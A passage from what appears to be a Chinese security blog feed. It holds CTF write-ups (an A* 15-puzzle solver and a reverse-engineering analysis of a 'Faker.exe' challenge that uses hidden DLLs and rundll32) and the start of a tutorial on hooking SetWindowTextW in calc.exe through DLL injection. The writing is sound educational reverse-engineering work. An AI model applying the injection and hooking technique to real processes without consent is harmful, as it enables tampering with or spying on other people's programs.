class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始状态</span></span><br><span class="line"><span class="comment"># S0 = [[11, 9, 4, 15],</span></span><br><span class="line"><span class="comment">#       [1, 3, 0, 12],</span></span><br><span class="line"><span class="comment">#       [7, 5, 8, 6],</span></span><br><span class="line"><span class="comment">#       [13, 2, 10, 14]]</span></span><br><span class="line">S0 = [[<span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line">      [<span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">      [<span class="number">13</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">      [<span class="number">14</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">12</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标状态</span></span><br><span class="line">SG = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">      [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">      [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>],</span><br><span class="line">      [<span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上下左右四个方向移动</span></span><br><span class="line">MOVE = &#123;<span class="string">&#x27;up&#x27;</span>: [<span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">        <span class="string">&#x27;down&#x27;</span>: [-<span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">        <span class="string">&#x27;left&#x27;</span>: [<span class="number">0</span>, -<span class="number">1</span>],</span><br><span class="line">        <span class="string">&#x27;right&#x27;</span>: [<span class="number">0</span>, <span class="number">1</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># OPEN表</span></span><br><span class="line">OPEN = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点的总数</span></span><br><span class="line">SUM_NODE_NUM = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 状态节点</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">State</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, deepth=<span class="number">0</span>, rest_dis=<span class="number">0.0</span>, state=<span class="literal">None</span>, hash_value=<span class="literal">None</span>, father_node=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        初始化</span></span><br><span class="line"><span class="string">        :参数 deepth: 从初始节点到目前节点所经过的步数</span></span><br><span class="line"><span class="string">        :参数 rest_dis: 启发距离</span></span><br><span class="line"><span class="string">        :参数 state: 节点存储的状态 4*4的列表</span></span><br><span class="line"><span class="string">        :参数 hash_value: 哈希值，用于判重</span></span><br><span class="line"><span class="string">        :参数 father_node: 父节点指针</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.deepth = deepth</span><br><span class="line">        self.rest_dis = rest_dis</span><br><span class="line">        self.fn = self.deepth + self.rest_dis</span><br><span class="line">        self.child = []  <span class="comment"># 孩子节点</span></span><br><span class="line">        self.father_node = father_node  <span class="comment"># 父节点</span></span><br><span class="line">        self.state = state  <span class="comment"># 局面状态</span></span><br><span class="line">        self.hash_value = hash_value  <span class="comment"># 哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span>(<span class="params">self, other</span>):</span>  <span class="comment"># 用于堆的比较，返回距离最小的</span></span><br><span class="line">        <span class="keyword">return</span> self.fn &lt; other.fn</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span>  <span class="comment"># 相等的判断</span></span><br><span class="line">        <span class="keyword">return</span> self.hash_value == other.hash_value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__ne__</span>(<span class="params">self, other</span>):</span>  <span class="comment"># 不等的判断</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> self.__eq__(other)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_M_distence</span>(<span class="params">cur_state</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    计算曼哈顿距离</span></span><br><span class="line"><span class="string">    :参数 state: 当前状态,4*4的列表, State.state</span></span><br><span class="line"><span class="string">    :返回: M_cost 每一个节点计算后的曼哈顿距离总和</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    M_cost = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> cur_state[i][j] == SG[i][j]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            num = cur_state[i][j]</span><br><span class="line">            <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">                x, y = <span class="number">3</span>, <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = num / <span class="number">4</span>  <span class="comment"># 理论横坐标</span></span><br><span class="line">                y = num - <span class="number">4</span> * x - <span class="number">1</span>  <span class="comment"># 理论的纵坐标</span></span><br><span class="line">                M_cost += (<span class="built_in">abs</span>(x - i) + <span class="built_in">abs</span>(y - j))</span><br><span class="line">    <span class="keyword">return</span> M_cost</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_E_distence</span>(<span class="params">cur_state</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    计算曼哈顿距离</span></span><br><span class="line"><span class="string">    :参数 state: 当前状态,4*4的列表, State.state</span></span><br><span class="line"><span class="string">    :返回: M_cost 每一个节点计算后的曼哈顿距离总和</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    E_cost = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> cur_state[i][j] == SG[i][j]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            num = cur_state[i][j]</span><br><span class="line">            <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">                x, y = <span class="number">3</span>, <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = num / <span class="number">4</span>  <span class="comment"># 理论横坐标</span></span><br><span class="line">                y = num - <span class="number">4</span> * x - <span class="number">1</span>  <span class="comment"># 理论的纵坐标</span></span><br><span class="line">                E_cost += math.sqrt((x - i)*(x - i) + (y - j)*(y - j))</span><br><span class="line">    <span class="keyword">return</span> E_cost</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_child</span>(<span class="params">sn_node, sg_node, hash_set, open_table, cal_distence</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    生成子节点函数</span></span><br><span class="line"><span class="string">    :参数 sn_node:  当前节点</span></span><br><span class="line"><span class="string">    :参数 sg_node:  最终状态节点</span></span><br><span class="line"><span class="string">    :参数 hash_set:  哈希表，用于判重</span></span><br><span class="line"><span class="string">    :参数 open_table: OPEN表</span></span><br><span class="line"><span class="string">    :参数 cal_distence: 距离函数</span></span><br><span class="line"><span class="string">    :返回: None</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> sn_node == sg_node:</span><br><span class="line">        heapq.heappush(open_table, sg_node)</span><br><span class="line">        print(<span class="string">&#x27;已找到终止状态！&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> sn_node.state[i][j] != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> [<span class="string">&#x27;up&#x27;</span>, <span class="string">&#x27;down&#x27;</span>, <span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;right&#x27;</span>]:  <span class="comment"># 四个偏移方向</span></span><br><span class="line">                x = i + MOVE[d][<span class="number">0</span>]</span><br><span class="line">                y = j + MOVE[d][<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt;= <span class="number">4</span> <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt;= <span class="number">4</span>:  <span class="comment"># 越界了</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                state = copy.deepcopy(sn_node.state)  <span class="comment"># 复制父节点的状态</span></span><br><span class="line">                state[i][j], state[x][y] = state[x][y], state[i][j]  <span class="comment"># 交换位置</span></span><br><span class="line">                h = <span class="built_in">hash</span>(<span class="built_in">str</span>(state))  <span class="comment"># 哈希时要先转换成字符串</span></span><br><span class="line">                <span class="keyword">if</span> h <span class="keyword">in</span> hash_set:  <span class="comment"># 重复了</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                hash_set.add(h)  <span class="comment"># 加入哈希表</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 记录扩展节点的个数</span></span><br><span class="line">                <span class="keyword">global</span> SUM_NODE_NUM</span><br><span class="line">                SUM_NODE_NUM += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                deepth = sn_node.deepth + <span class="number">1</span>  <span class="comment"># 已经走的距离函数</span></span><br><span class="line">                rest_dis = cal_distence(state)  <span class="comment"># 启发的距离函数</span></span><br><span class="line">                node = State(deepth, rest_dis, state, h, sn_node)  <span class="comment"># 新建节点</span></span><br><span class="line">                sn_node.child.append(node)  <span class="comment"># 加入到孩子队列</span></span><br><span class="line">                heapq.heappush(open_table, node)  <span class="comment"># 加入到堆中</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># show_block(state, deepth) # 打印每一步的搜索过程</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_block</span>(<span class="params">block, step</span>):</span></span><br><span class="line">    print(<span class="string">&quot;------&quot;</span>, step, <span class="string">&quot;--------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> block:</span><br><span class="line">        print(b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_path</span>(<span class="params">node</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    输出路径</span></span><br><span class="line"><span class="string">    :参数 node: 最终的节点</span></span><br><span class="line"><span class="string">    :返回: None</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;最终搜索路径为：&quot;</span>)</span><br><span class="line">    steps = node.deepth</span><br><span class="line"></span><br><span class="line">    stack = []  <span class="comment"># 模拟栈</span></span><br><span class="line">    <span class="keyword">while</span> node.father_node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        stack.append(node.state)</span><br><span class="line">        node = node.father_node</span><br><span class="line">    stack.append(node.state)</span><br><span class="line">    step = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(stack) != <span class="number">0</span>:</span><br><span class="line">        t = stack.pop()</span><br><span class="line">        show_block(t, step)</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> steps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">A_start</span>(<span class="params">start, end, distance_fn, generate_child_fn</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    A*算法</span></span><br><span class="line"><span class="string">    :参数 start: 起始状态</span></span><br><span class="line"><span class="string">    :参数 end: 终止状态</span></span><br><span class="line"><span class="string">    :参数 distance_fn: 距离函数，可以使用自定义的</span></span><br><span class="line"><span class="string">    :参数 generate_child_fn: 产生孩子节点的函数</span></span><br><span class="line"><span class="string">    :返回: 最优路径长度</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    root = State(<span class="number">0</span>, <span class="number">0</span>, start, <span class="built_in">hash</span>(<span class="built_in">str</span>(S0)), <span class="literal">None</span>)  <span class="comment"># 根节点</span></span><br><span class="line">    end_state = State(<span class="number">0</span>, <span class="number">0</span>, end, <span class="built_in">hash</span>(<span class="built_in">str</span>(SG)), <span class="literal">None</span>)  <span class="comment"># 最后的节点</span></span><br><span class="line">    <span class="keyword">if</span> root == end_state:</span><br><span class="line">        print(<span class="string">&quot;start == end !&quot;</span>)</span><br><span class="line"></span><br><span class="line">    OPEN.append(root)</span><br><span class="line">    heapq.heapify(OPEN)</span><br><span class="line"></span><br><span class="line">    node_hash_set = <span class="built_in">set</span>()  <span class="comment"># 存储节点的哈希值</span></span><br><span class="line">    node_hash_set.add(root.hash_value)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(OPEN) != <span class="number">0</span>:</span><br><span class="line">        top = heapq.heappop(OPEN)</span><br><span class="line">        <span class="keyword">if</span> top == end_state:  <span class="comment"># 结束后直接输出路径</span></span><br><span class="line">            <span class="keyword">return</span> print_path(top)</span><br><span class="line">        <span class="comment"># 产生孩子节点，孩子节点加入OPEN表</span></span><br><span class="line">        generate_child_fn(sn_node=top, sg_node=end_state, hash_set=node_hash_set,</span><br><span class="line">                          open_table=OPEN, cal_distence=distance_fn)</span><br><span class="line">    print(<span class="string">&quot;无搜索路径!&quot;</span>)  <span class="comment"># 没有路径</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可配置式运行文件</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;选择距离计算方法&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--method&#x27;</span>, <span class="string">&#x27;-m&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;method 选择距离计算方法(cal_E_distence or cal_M_distence)&#x27;</span>, default = <span class="string">&#x27;cal_M_distence&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    method = args.method</span><br><span class="line"></span><br><span class="line">    time1 = time.time()</span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&#x27;cal_E_distence&#x27;</span>:</span><br><span class="line">        length = A_start(S0, SG, cal_E_distence, generate_child)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = A_start(S0, SG, cal_M_distence, generate_child)</span><br><span class="line">    time2 = time.time()</span><br><span class="line">    <span class="keyword">if</span> length != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> method == <span class="string">&#x27;cal_E_distence&#x27;</span>:</span><br><span class="line">            print(<span class="string">&quot;采用欧式距离计算启发函数&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;采用曼哈顿距离计算启发函数&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;搜索最优路径长度为&quot;</span>, length)</span><br><span class="line">        print(<span class="string">&quot;搜索时长为&quot;</span>, (time2 - time1), <span class="string">&quot;s&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;共检测节点数为&quot;</span>, SUM_NODE_NUM)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据程序的方向，换一下，得到###$@%#$$@@@%#%#%@$@%##$$@@%##%#</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">table=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;$&#x27;</span> ,<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;%&#x27;</span> ,<span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;@&#x27;</span> ,<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;#&#x27;</span> &#125;</span><br><span class="line">s=<span class="string">&#x27;sssawdsaawwwdsdsdwawdssaawwdssds&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(table[i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后md5加密。</p><h2 id="Faker-exe"><a href="#Faker-exe" class="headerlink" title="Faker.exe"></a>Faker.exe</h2><p>题目名称不叫Faker.exe，绿盟杯的一道500分的题，动态分可能更高，比赛时没做起，最后发现是脚本，我愚蠢的吧if判断条件后面加了个分号，低级错误，导致没能进线下，我是傻逼。</p><p>一道类似于病毒的题，以隐藏文件形式创建了个dll文件，并且在exe中用命令行执行来调用dll文件的导出函数，也就是cherk，传入的参数是26字节，也就是flag{}中间部分，然后进行了一些操作。</p><p>可以根据弹出的字符串和GetWindowsText函数来定位到关键位置。<br><img src="https://i.loli.net/2021/10/27/Q5jpYd2C9VgHcP8.png"><br>接下来就会以隐藏模式创建FakerDll和Faker.dll文件。<br><img src="https://i.loli.net/2021/10/27/Nf2vPD5qIZOa49p.png"><br>接下来会自解密两个字符串，并将flag{}内的内容和两个字符串拼接起来。<br><img src="https://i.loli.net/2021/10/27/tnE7WQIGsXp9d8a.png"><br>我们来看看最后的字符串会变成什么样子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s1=<span class="string">&quot;D;]Xjoepxt]TztXPX75]svoemm43/fyf GblfsEmm/emm-Difdl&quot;</span></span><br><span class="line">s2=<span class="string">&quot;D;]Xjoepxt]TztXPX75]svoemm43/fyf GblfsEmm/emm-Difdl&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s1[i])-<span class="number">1</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(end=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s2[i])-<span class="number">1</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(end=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># C:\Windows\SysWOW64\rundll32.exe FakerDll.dll,Check</span></span><br><span class="line"><span class="comment"># C:\Windows\SysWOW64\rundll32.exe FakerDll.dll,Check</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后拼接上flag，所以已经可以想到了，这个是想用windows自带的rundll32.exe来启动dll文件来检测flag是否正确，接下来，看sub_402680函数。<br><img src="https://i.loli.net/2021/10/27/kMZaXj9LCqo7RNB.png"><br>Faker.dll分析。</p><p>check函数<br><img src="https://i.loli.net/2021/10/27/IcEvsh4wuWB9DT8.png"><br>字符串处理函数<br><img src="https://i.loli.net/2021/10/27/kLYoIpUiFR5gfdn.png"><br>然后写脚本，先base64解，再异或，当然，因为个人的低级错误，分号的问题，导致没得到正确答案，也是非常可惜。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//C:\Windows\SysWOW64\rundll32.exe FakerDll.dll,Check aa </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s3[]=<span class="string">&quot;sbVnXr_G`By&lt;Dp]5gIUmGk6t4x&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( ((s3[i]^<span class="number">0xf</span> ) &lt;= <span class="string">&#x27;z&#x27;</span>) &amp;&amp; ( (s3[i]^ <span class="number">0xf</span> ) &gt;= <span class="string">&#x27;0&#x27;</span> ))</span><br><span class="line">&#123;</span><br><span class="line">s3[i] ^= <span class="number">0xf</span>;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">13</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( ((s3[i]^<span class="number">5</span> ) &lt;= <span class="string">&#x27;z&#x27;</span> )&amp;&amp; ( (s3[i]^<span class="number">5</span> ) &gt;= <span class="string">&#x27;0&#x27;</span> ))</span><br><span class="line">&#123;</span><br><span class="line">s3[i] ^= <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s3[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//smYaWrPHoMv3KuX0bLPhBn3q1x</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hook API</title>
      <link href="2021/10/19/Hook%20API/"/>
      <url>2021/10/19/Hook%20API/</url>
      
        <content type="html"><![CDATA[<h1 id="Hook-API"><a href="#Hook-API" class="headerlink" title="Hook API"></a>Hook API</h1><p>先说说最近干什么，最近一直在分析《恶代》的样本，简单看了看免杀，分析到Lab9了，Lab10中有个隐藏进程的知识点，或许可以和HOOK结合起来，然后就是看书上HOOK API的知识点，实际上之前就看过了，一直没总结，然后就是忙实验室招新的问题，带带学弟学妹打打今年的极客，免费工具人，不过感觉目前今年极客re部分的题出的不是太好。</p><p>本文章记录《逆理》书中关于HOOK API的相关知识。</p><h2 id="DLL注入来钩取API"><a href="#DLL注入来钩取API" class="headerlink" title="DLL注入来钩取API"></a>DLL注入来钩取API</h2><p>这种技术有限制，就是只能勾取程序包含的dll中的API函数。</p><p>本文将通过HOOK计算器的SetWindowsText这个函数来使计算器输入数字，但显示中文字符。</p><h3 id="xdbg调试"><a href="#xdbg调试" class="headerlink" title="xdbg调试"></a>xdbg调试</h3><p>我们先直接用xdbg调试的方法实现。</p><p>首先这个SetWindowsText函数，有SetWindowsTextA，SetWindowsTextW，实际上也就是ASSCII和UNICODE的区别，这个计算器也就是用的SetWindowsTextW。</p><p>然后来说说这个首先要找这个程序什么地方调用了这个SetWindowsTextW函数，我用xdbg只能找到SetWindowsTextW这个函数的内部，没找到调用，于是我用ida的交叉引用去找到了调用。<br><img src="https://i.loli.net/2021/10/18/HNrGwaOYBRbquSp.png"><br>接下来我们在去打断点，然后开始用xdbg去调试，最后断在了这里。<br><img src="https://i.loli.net/2021/10/18/PkoUOKu2WC8Ig16.png"><br>我们修改字符为中文字符<br><img src="https://i.loli.net/2021/10/18/8ANrykVM61v2gch.png"><br>然后f9运行，查看结果。<br><img src="https://i.loli.net/2021/10/18/TZ1NEOohzVKyCQl.png"></p><p>变成了七。</p><h3 id="DLL注入实现"><a href="#DLL注入实现" class="headerlink" title="DLL注入实现"></a>DLL注入实现</h3><p>接下来使用DLL注入实现Hook。这个过程需要对pe结构有一定的了解，比如说怎么去定位到想要的函数地址。</p><h4 id="Hook原理"><a href="#Hook原理" class="headerlink" title="Hook原理"></a>Hook原理</h4><p>先说说Hook原理</p><ul><li>钩取calc.exe中user32.dll的SetWindowTextW函数。</li><li>将其替换为我们自己写的My_SWT，然后修改传入SetWindowTextW的数据，也就是将第二个参数修改为中文字符。</li><li>然后继续调用原SetWindowTextW函数。</li></ul><p>书上的图片，可以帮助理解。<br><img src="https://i.loli.net/2021/10/18/1h2v4gj8zpwFlKV.png"></p><h4 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h4><p>我跟着书上的代码，自己也来写了写。</p><p>My_SWT函数，这个函数用来将数字变中文字符。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">My_SWT</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">wchar_t</span>* table = <span class="string">L&quot;零一二三四五六七八九&quot;</span>;</span><br><span class="line">    <span class="keyword">wchar_t</span> temp;</span><br><span class="line">    <span class="keyword">int</span> len, i, index;</span><br><span class="line">    len = wcslen(lpString);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="string">L&#x27;9&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = lpString[i];</span><br><span class="line">            index = _wtoi((<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)&amp;temp);</span><br><span class="line">            lpString[i] = table[index];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)orig_SWT)(hWnd, lpString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以写个test去使用这个函数看看有没有错误。</span></span><br></pre></td></tr></table></figure><p>可以看到使用的是wchar_t，因为这个exe使用的是SetWindowTextW，每个数字其实占两个字节，循环里面做的就是把字符数字转为10进制的数，然后在定义好的中文表中取值。最后再次调用真正的SetWindowTextW函数。</p><p>myhook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 